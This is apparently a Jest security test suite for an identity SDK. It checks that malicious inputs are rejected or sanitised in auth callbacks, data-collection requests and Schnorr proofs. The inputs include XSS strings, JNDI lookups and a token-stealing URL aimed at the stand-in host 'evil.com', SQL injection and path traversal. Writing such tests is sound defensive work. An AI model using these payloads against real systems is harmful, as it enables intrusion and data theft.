import { IdentitySDK } from '../../src/IdentitySDK';
import { MemoryStorage } from '../../src/MemoryStorage';
import { createMockSDKConfig } from '../setup';
import { installIdentityEventAutoResolve } from '../identityEventTestSetup';

describe('SDK Security Tests', () => {
  let sdk: IdentitySDK;
  let uninstallEvents: () => void;

  beforeEach(() => {
    uninstallEvents = installIdentityEventAutoResolve();
    sdk = new IdentitySDK(createMockSDKConfig(), new MemoryStorage());
  });

  afterEach(() => {
    uninstallEvents();
    jest.clearAllMocks();
    global.fetch = jest.fn() as typeof fetch;
  });

  describe('Input Validation', () => {
    it('rejects malformed authentication callback URLs', async () => {
      const maliciousUrls = [
        'javascript:alert("xss")',
        'data:text/html,<script>alert("xss")</script>',
        'http://evil.com/steal-tokens',
        'ftp://malicious.com/exploit',
      ];

      for (const url of maliciousUrls) {
        const response = await sdk.handleAuthCallback(url);
        expect(response.success).toBe(false);
      }
    });

    it('rejects unknown data points in collection requests', async () => {
      const maliciousRequest = {
        platform: '<script>alert("xss")</script>',
        dataPoints: ['<img src=x onerror=alert("xss")>'],
        purpose: 'javascript:alert("xss")',
        consentText: 'c',
        dataUsage: 'u',
      };

      await expect(sdk.requestDataCollection(maliciousRequest as any)).rejects.toThrow();
    });

    it('validates data point IDs', () => {
      const maliciousIds = [
        '../etc/passwd',
        '<script>alert("xss")</script>',
        '${jndi:ldap://evil.com/exploit}',
        '; DROP TABLE users; --',
      ];

      for (const id of maliciousIds) {
        expect(sdk.validateDataPointRequest(id)).toBe(false);
      }
    });
  });

  describe('Authentication Security', () => {
    it('rejects CSRF (state mismatch)', async () => {
      await sdk.initializeAuth();
      const csrfUrl = `http://localhost:3000/callback?code=test&state=different-state`;
      const response = await sdk.handleAuthCallback(csrfUrl);
      expect(response.success).toBe(false);
    });

    it('rejects callbacks missing valid OAuth state', async () => {
      const maliciousTokens = [
        '${jndi:ldap://evil.com/exploit}',
        '<script>alert("xss")</script>',
        '; DROP TABLE tokens; --',
        '../../../etc/passwd',
      ];

      for (const token of maliciousTokens) {
        const response = await sdk.handleAuthCallback(
          `http://localhost:3000/callback?code=${encodeURIComponent(token)}`
        );
        expect(response.success).toBe(false);
      }
    });
  });

  describe('Zero-Knowledge Proof Security', () => {
    it('verifyProof returns booleans for repeated checks', async () => {
      const proof = await sdk.generateProof('schnorr', { privateKey: {} as CryptoKey });
      expect(typeof (await sdk.verifyProof(proof, 'schnorr'))).toBe('boolean');
      expect(typeof (await sdk.verifyProof(proof, 'schnorr'))).toBe('boolean');
    });

    it('rejects malformed Schnorr proof material', async () => {
      const maliciousProofs = [
        { type: 'schnorr', commitment: null },
        { type: 'schnorr', challenge: '' },
        { type: 'schnorr', response: undefined },
        { type: 'schnorr', commitment: '<script>alert("xss")</script>' },
        { type: 'schnorr', challenge: '${jndi:ldap://evil.com/exploit}' },
      ];

      for (const proof of maliciousProofs) {
        const isValid = await sdk.verifyProof(proof, 'schnorr');
        expect(isValid).toBe(false);
      }
    });

    it('does not embed private key strings in generated proof JSON', async () => {
      const privateKey = 'secret-private-key-12345';
      const proof = await sdk.generateProof('schnorr', { privateKey: privateKey as unknown as CryptoKey });
      const proofString = JSON.stringify(proof);
      expect(proofString).not.toContain(privateKey);
    });
  });

  describe('Data Collection Security', () => {
    it('rejects mixed valid/invalid data point ids', async () => {
      const maliciousData = {
        platform: 'test-platform',
        dataPoints: [
          'email',
          '<script>alert("xss")</script>',
          '${jndi:ldap://evil.com/exploit}',
          '; DROP TABLE data_points; --',
        ],
        purpose: 'authentication',
        consentText: 'c',
        dataUsage: 'u',
      };

      await expect(sdk.requestDataCollection(maliciousData as any)).rejects.toThrow();
    });

    it('returns failure for incomplete proposals', async () => {
      const maliciousProposal = {
        name: '<script>alert("xss")</script>',
        description: '${jndi:ldap://evil.com/exploit}',
        category: 'identity',
        dataType: 'string',
        requiredFields: [],
        examples: [],
        proposedBy: 'test-user-id',
      };

      const result = await sdk.proposeDataPoint(maliciousProposal as any);
      expect(result.success).toBe(false);
    });

    it('sanitizes untrusted values via DataCollectionManager', () => {
      const dcm = sdk.getDataCollectionManager();
      const maliciousValues = [
        '<script>alert("xss")</script>',
        '${jndi:ldap://evil.com/exploit}',
        '; DROP TABLE users; --',
      ];

      for (const value of maliciousValues) {
        expect(dcm.sanitizeDataPointValue(value)).not.toContain('<script>');
      }
    });
  });

  describe('Storage Security', () => {
    it('allows injecting custom storage adapters', () => {
      const mockStorage = {
        getItem: jest.fn(),
        setItem: jest.fn(),
        removeItem: jest.fn(),
      };

      const sdkWithStorage = new IdentitySDK(createMockSDKConfig(), mockStorage);
      expect(sdkWithStorage).toBeDefined();
    });

    it('constructs even if storage methods throw (caller handles persistence)', () => {
      const failingStorage = {
        getItem: jest.fn().mockImplementation(() => {
          throw new Error('Storage error');
        }),
        setItem: jest.fn().mockImplementation(() => {
          throw new Error('Storage error');
        }),
        removeItem: jest.fn().mockImplementation(() => {
          throw new Error('Storage error');
        }),
      };

      expect(() => new IdentitySDK(createMockSDKConfig(), failingStorage)).not.toThrow();
    });
  });

  describe('Network Security', () => {
    it('handles network errors from fetch during token exchange', async () => {
      global.fetch = jest.fn().mockRejectedValue(new Error('Network error'));

      const response = await sdk.handleAuthCallback('http://localhost:3000/callback?code=test');
      expect(response.success).toBe(false);
    });
  });

  describe('Cryptographic Security', () => {
    it('uses randomness so proofs differ across calls', async () => {
      const proof1 = await sdk.generateProof('schnorr', { privateKey: {} as CryptoKey });
      const proof2 = await sdk.generateProof('schnorr', { privateKey: {} as CryptoKey });
      expect(proof1).not.toEqual(proof2);
    });

    it('placeholder generator accepts varied inputs without throwing', async () => {
      const inputs = [
        { privateKey: '' as unknown as CryptoKey },
        { privateKey: null as unknown as CryptoKey },
        { privateKey: undefined as unknown as CryptoKey },
      ];

      for (const input of inputs) {
        const proof = await sdk.generateProof('schnorr', input);
        expect(proof).toBeDefined();
      }
    });
  });

  describe('Error Handling Security', () => {
    it('returns structured failure for invalid callback URLs (no throw)', async () => {
      const response = await sdk.handleAuthCallback('invalid-url');
      expect(response.success).toBe(false);
    });

    it('handles malformed token responses safely', async () => {
      global.fetch = jest.fn().mockResolvedValue({
        ok: true,
        json: () => Promise.resolve({ invalid: 'response' }),
      });

      const response = await sdk.handleAuthCallback('http://localhost:3000/callback?code=test');
      expect(response.success).toBe(false);
    });
  });
});
